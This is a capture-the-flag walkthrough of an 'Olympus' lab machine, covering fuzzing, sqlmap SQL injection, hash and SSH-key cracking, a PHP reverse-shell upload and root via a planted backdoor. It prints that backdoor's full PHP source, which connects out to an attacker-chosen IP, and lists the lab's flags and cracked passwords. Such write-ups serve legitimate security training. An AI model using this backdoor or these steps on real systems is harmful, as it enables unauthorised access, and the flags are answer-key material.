# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

We need to add `olympus.thm` to `/etc/hosts`:

```
echo 'IP olympus.thm' | sudo tee -a /etc/hosts
```

![Pasted image 20250501133051.png](../../IMAGES/Pasted%20image%2020250501133051.png)

It says the old version of the website is still accessible on the domain, let's perform subdomain fuzzing and directory fuzzing:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.62.45 -H "Host: FUZZ.olympus.thm" -mc 200,301,302 -fs 0 -t 100 -ic -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.62.45
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.olympus.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response size: 0
________________________________________________
```

No subdomains were found on the scan, let's fuzz hidden directories using `dirb` and `ffuf`

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://olympus.thm/FUZZ" -ic -c -t 200 -e .php,.html,.git

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .git
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms]
index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 190ms]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 184ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 184ms]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 182ms]
```


```
dirb http://olympus.thm/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu May  1 18:35:23 2025
URL_BASE: http://olympus.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://olympus.thm/ ----
==> DIRECTORY: http://olympus.thm/~webmaster/
```

We got a directory named `~webmaster/`, let's check it out:


![Pasted image 20250501133745.png](../../IMAGES/Pasted%20image%2020250501133745.png)

If we click `credentials`, it redirects us to a `404` status code site, if go down on the website, we can see this:


![Pasted image 20250501133940.png](../../IMAGES/Pasted%20image%2020250501133940.png)


We got a search bar and a login page, let's use the search bar to test `XSS` and `SQLI`:

![Pasted image 20250501134143.png](../../IMAGES/Pasted%20image%2020250501134143.png)

What about `SQLI`:


![Pasted image 20250501134223.png](../../IMAGES/Pasted%20image%2020250501134223.png)

![Pasted image 20250501134235.png](../../IMAGES/Pasted%20image%2020250501134235.png)

As we can see, there's an error in our SQL syntax, this is vulnerable to `SQLI`, let's submit the request to `sqlmap` and begin exploitation phase.


# EXPLOITATION
---


Let's save the request to a file and do the following `sqlmap` command:

```bash
sqlmap -r "$(pwd)/req.req" -p search --level=5 --risk=3 --threads=10 --dump
```

We will get some interesting tables:

![Pasted image 20250501135053.png](../../IMAGES/Pasted%20image%2020250501135053.png)

![Pasted image 20250501135102.png](../../IMAGES/Pasted%20image%2020250501135102.png)

Got our first flag:

```
flag{Sm4rt!_k33P_d1gGIng}
```


![Pasted image 20250501135150.png](../../IMAGES/Pasted%20image%2020250501135150.png)

We got some hashes, let's get them to a file and use john:

```
cat << 'EOF' > hashes.txt
prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
EOF
```

```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
summertime       (prometheus)
```

We got credentials for `prometheus`, let's go inside the admin panel:


![Pasted image 20250501135943.png](../../IMAGES/Pasted%20image%2020250501135943.png)


If we recall the `sqlmap` output, we can see the following emails:

```
root@chat.olympus.thm
zeus@chat.olympus.thm
```

This means there could be a `chat.olympus.thm` subdomain, let's add it and check it:

![Pasted image 20250501140604.png](../../IMAGES/Pasted%20image%2020250501140604.png)

We can go with our found credentials:

![Pasted image 20250501140629.png](../../IMAGES/Pasted%20image%2020250501140629.png)

Since there needs to be an `uploads` directory, we need to fuzz to check if it was changed to another name:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://chat.olympus.thm/FUZZ" -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://chat.olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

static                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 204ms]
javascript              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 191ms]
uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 182ms]
```

Here it is, if we remember the dump, we got a file in it, let's try to read it:


```
http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt
```


![Pasted image 20250501141005.png](../../IMAGES/Pasted%20image%2020250501141005.png)

Damn, we need another method to exploit this, let's go back to the chat:

![Pasted image 20250501141026.png](../../IMAGES/Pasted%20image%2020250501141026.png)

The most interesting part on here is that we can upload files, let's try uploading a reverse shell, there may not be any kind of blacklist of file extensions so we can upload it without restrictions, if not, we need to bypass this, let's try:

![Pasted image 20250501141218.png](../../IMAGES/Pasted%20image%2020250501141218.png)


![Pasted image 20250501141227.png](../../IMAGES/Pasted%20image%2020250501141227.png)

It attached, the issue is that, as the chat says, there is a random file name function that automatically changes the name of every file, we need some way to figure out which name our file got.

For this, we can exploit the `SQLI` again, let's dump the database once again with sqlmap, we can use this command:

```bash
sqlmap -r "$(pwd)/req.req" -p search --level=5 --risk=3 --threads=10 --dump -T chats
```

If we check the table again:

![Pasted image 20250501141700.png](../../IMAGES/Pasted%20image%2020250501141700.png)

Nice, we got the name of our file, let's visit it:

```
http://chat.olympus.thm/uploads/d8ab3d48244503df9c33b162b43fe698.php
```

If we have our listener ready, we will receive the connection:

![Pasted image 20250501141752.png](../../IMAGES/Pasted%20image%2020250501141752.png)

Let's proceed to privilege escalation.


# PRIVILEGE ESCALATION
---

We need to stabilize our shell first:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250501141935.png](../../IMAGES/Pasted%20image%2020250501141935.png)

Let's use `linpeas`:

![Pasted image 20250501142701.png](../../IMAGES/Pasted%20image%2020250501142701.png)

We got a binary called `cputils`, let's use it and check what it does:

```
www-data@olympus:/tmp$ cputils
  ____ ____        _   _ _
 / ___|  _ \ _   _| |_(_) |___
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/

Enter the Name of Source File: .

Enter the Name of Target File: .

Error Occurred!
```

Seems like it simply copies files, let's copy `zeus` `id_rsa`:

```
www-data@olympus:/tmp$ cputils
  ____ ____        _   _ _
 / ___|  _ \ _   _| |_(_) |___
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/

Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: id_rsa

File copied successfully
```

There we go, we got `id_rsa`, we can now go into ssh as `zeus`:

```
ssh zeus@olympus.thm -i id_rsa
Enter passphrase for key 'id_rsa':
```

Maybe not, let's crack the passphrase using john:

```
ssh2john id_rsa > id_rsa.hash

john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

snowflake
```

We got it, let's go into ssh now:

![Pasted image 20250501145659.png](../../IMAGES/Pasted%20image%2020250501145659.png)

We can now read second flag:

```
zeus@olympus:~$ cat user.flag
flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
```

If we go to `/var/www/html`, we can notice this:

```
zeus@olympus:/var/www/html$ ls -la
total 28
drwxr-xr-x 3 www-data www-data  4096 May  1  2022 .
drwxr-xr-x 5 root     root      4096 Mar 22  2022 ..
drwxrwx--x 2 root     zeus      4096 Jul 15  2022 0aB44fdS3eDnLkpsz3deGv8TttR4sc
-rwxr-xr-x 1 root     root     10988 Apr 18  2022 index.html.old
-rwxr-xr-x 1 root     root        57 Apr 18  2022 index.php
```

We got a weird directory:

```
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la
total 12
drwxrwx--x 2 root     zeus     4096 Jul 15  2022 .
drwxr-xr-x 3 www-data www-data 4096 May  1  2022 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14  2022 index.html
-rwxr-xr-x 1 root     zeus     1589 Jul 15  2022 VIGQFQFMYOST.php
```

Let's read the file:

```php
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
```

This PHP script is an authenticated reverse shell backdoor that provides remote system access when triggered with specific parameters. After verifying a hardcoded MD5 password via POST, it executes a reverse shell connection to an attacker-controlled IP/port specified in GET parameters (`?ip=X&port=Y`). The criticalÂ `$shell`Â variable executesÂ `uname -a; w; /lib/defended/libc.so.99`Â - first running system reconnaissance commands, then executing a hidden SUID binary (`libc.so.99`) likely designed for privilege escalation.

So, in order to get a shell as root, we can do this:

```bash
uname -a; w; /lib/defended/libc.so.99
```

![Pasted image 20250501150356.png](../../IMAGES/Pasted%20image%2020250501150356.png)

There we go, we got root, let's find the 2 flags we are missing and finish the CTF:

```
find / -type f -name "*.flag" 2>/dev/null
/root/root.flag
/home/zeus/user.flag
```

Hmm, still missing the last flag, let's use grep, since we know all flags go with this format:

```
flag{}
```

We can go with this command:

```bash
find / -readable -type f -exec grep -PHoa 'flag{[^}]+}' {} \; 2>/dev/null

/root/root.flag:flag{D4mN!_Y0u_G0T_m3_:)_}
/home/zeus/user.flag:flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
etc/ssl/private/.b0nus.fl4g:flag{Y0u_G0t_m3_g00d!}
```

We can submit both flags and end the CTF.


![Pasted image 20250501151712.png](../../IMAGES/Pasted%20image%2020250501151712.png)


